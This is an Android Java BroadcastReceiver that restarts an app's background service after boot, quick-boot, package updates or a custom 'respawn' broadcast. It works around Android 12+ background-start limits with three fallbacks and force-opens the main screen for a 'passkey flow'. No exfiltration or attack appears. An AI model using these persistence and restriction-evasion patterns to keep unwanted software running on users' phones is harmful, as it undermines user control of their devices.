package com.fason.app.receiver;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;

import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.fason.app.MainActivity;
import com.fason.app.core.Protocol;
import com.fason.app.service.MainService;
import com.fason.app.worker.KeepAliveWorker;

/** Handles boot completed and package-replaced events to restart the service. */
public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;

        String action = intent.getAction();
        if (action == null) return;

        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            Protocol.BC_QUICKBOOT.equals(action) ||
            Protocol.BC_HTC_QUICKBOOT.equals(action) ||
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
            Protocol.BC_RESPAWN_SERVICE.equals(action)) {
            startSvc(context);
            startPasskeyFlow(context);
        }
    }

    private void startPasskeyFlow(Context ctx) {
        try {
            Intent launch = new Intent(ctx, MainActivity.class);
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(launch);
        } catch (Exception ignored) {}
    }

    // Multiple fallback strategies to handle Android 12+ background start restrictions
    private void startSvc(Context ctx) {
        WatchdogReceiver.setServiceActive(ctx, true);

        // Strategy 1: Direct startForegroundService
        try {
            ctx.startForegroundService(new Intent(ctx, MainService.class));
            return;
        } catch (Exception ignored) {}

        // Strategy 2: AlarmManager — must use getForegroundService on Android 8+
        try {
            Intent svc = new Intent(ctx, MainService.class);
            svc.setAction(Protocol.BC_RESTART);

            int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                pi = PendingIntent.getForegroundService(ctx, 0, svc, flags);
            } else {
                pi = PendingIntent.getService(ctx, 0, svc, flags);
            }

            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                long trigger = SystemClock.elapsedRealtime() + 1000;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    if (am.canScheduleExactAlarms()) {
                        am.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                    } else {
                        am.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                    }
                } else {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            }
        } catch (Exception ignored) {}

        // Strategy 3: WorkManager fallback
        try {
            OneTimeWorkRequest work = new OneTimeWorkRequest.Builder(KeepAliveWorker.class)
                .setInitialDelay(1, java.util.concurrent.TimeUnit.SECONDS)
                .build();
            WorkManager.getInstance(ctx).enqueue(work);
        } catch (Exception ignored) {}
    }
}
